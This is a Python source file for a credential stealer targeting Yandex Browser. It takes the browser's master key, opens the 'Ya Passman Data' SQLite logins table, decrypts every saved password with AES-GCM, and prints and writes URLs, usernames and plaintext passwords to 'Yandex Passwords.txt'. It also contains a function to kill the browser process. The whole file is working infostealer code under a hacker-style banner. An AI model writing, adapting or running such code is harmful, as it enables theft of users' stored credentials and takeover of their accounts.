import sqlite3
import os
import hashlib
import sys
import psutil
from colorama import Fore, init, Style
#------------------------------------------------------------------------------
from get_master_key_yandex import get_yandex_master_key, decrypt_aes_gcm


init()

class YandexStealData:

    def __init__(self, yandex_user_data_path: str) -> None:
        local_state_file_path: str = os.path.join(yandex_user_data_path, "Local State")

        if not os.path.exists(local_state_file_path):
            return
        # self.kill_yandex()
        
        self.master_key_and_profile: dict[str, bytes] = get_yandex_master_key(local_state_file_path)
        
        if self.master_key_and_profile and len(self.master_key_and_profile["key"]) == 32:
            
            yandex_ya_passman_data: str =  os.path.join(yandex_user_data_path, self.master_key_and_profile["profile"], "Ya Passman Data")

            if not os.path.exists(yandex_ya_passman_data):
                return
            
            self.extract_data_(yandex_ya_passman_data, self.master_key_and_profile["profile"])
                
    def kill_yandex(self) -> None:
        for process in psutil.process_iter(["pid", "name"]):
            if process.info["name"].lower() in ["yandex.exe", "browser.exe"]:
                process.kill()

    def extract_data_(self, db_path: str, profile: str) -> None:
        
        print(Fore.RED + r"""
_____.___.                  .___              ___________         __                        __                
\__  |   |____    ____    __| _/____ ___  ___ \_   _____/__  ____/  |_____________    _____/  |_  ___________ 
 /   |   \__  \  /    \  / __ |/ __ \\  \/  /  |    __)_\  \/  /\   __\_  __ \__  \ _/ ___\   __\/  _ \_  __ \
 \____   |/ __ \|   |  \/ /_/ \  ___/ >    <   |        \>    <  |  |  |  | \// __ \\  \___|  | (  <_> )  | \/
 / ______(____  /___|  /\____ |\___  >__/\_ \ /_______  /__/\_ \ |__|  |__|  (____  /\___  >__|  \____/|__|   
 \/           \/     \/      \/    \/      \/         \/      \/                  \/     \/                   
              
""" + Style.RESET_ALL)
        print("-"*110)
        try:
            print(Fore.BLUE+ "\n[+] Kill Process 'Yandex.exe'"+Style.RESET_ALL)
            print(Fore.GREEN + f"[+] Master Key: {self.master_key_and_profile['key'].hex()}" + Style.RESET_ALL)
            with sqlite3.connect(db_path) as con:
                curse = con.cursor()
                rows = curse.execute(
                    "SELECT origin_url, username_element, username_value, password_element, password_value, signon_realm FROM logins"
                )

                for row in rows.fetchall():
                    origin_url, username_element, username_value, password_element, password_value, signon_realm = row
                    if origin_url and username_element and username_value and password_element and password_value and signon_realm:
                        str_to_hash = origin_url + "\x00" + username_element + "\x00" + username_value + "\x00" + password_element + "\x00" + signon_realm
                        hash_object = hashlib.sha1(str_to_hash.encode('utf-8'))
                        hash_result = hash_object.digest()

                        iv: bytes = password_value[:12]   

                        password_valuee: bytes = password_value[12:]

                        password_decrypted: str = decrypt_aes_gcm(
                            password_valuee,
                            iv, 
                            self.master_key_and_profile["key"], 
                            hash_result
                        ).decode()
                        if password_decrypted:
                            data_forma: str = f"\nProfile: {profile}\nUrl: {origin_url}:\nUserName: {username_value}\nPassword: {password_decrypted}\n\n{"*"*22}"
                            print(data_forma)
                            with open('Yandex Passwords.txt', "a", encoding='utf-8', errors='ignore') as allPassword:
                                allPassword.write(data_forma)
                if os.path.exists('Yandex Passwords.txt'):
                    print(Fore.GREEN + f"[+] Extracted Data From: {profile}" + Style.RESET_ALL)
                    print(Fore.GREEN + "[+] All Data Has Been Extracted" + Style.RESET_ALL)
                    print(Fore.GREEN + "[+] File Saved As: Yandex Passwords.txt" + Style.RESET_ALL)
        except Exception as err:

            print(Fore.RED + f"[-] Error: {err}" + Style.RESET_ALL)

if __name__ == "__main__":
    user_data_yandex: str = os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data")
    if not os.path.exists(user_data_yandex):
        print(f"[-] Path not Exists {user_data_yandex}")
        sys.exit(0)
    YandexStealData(user_data_yandex)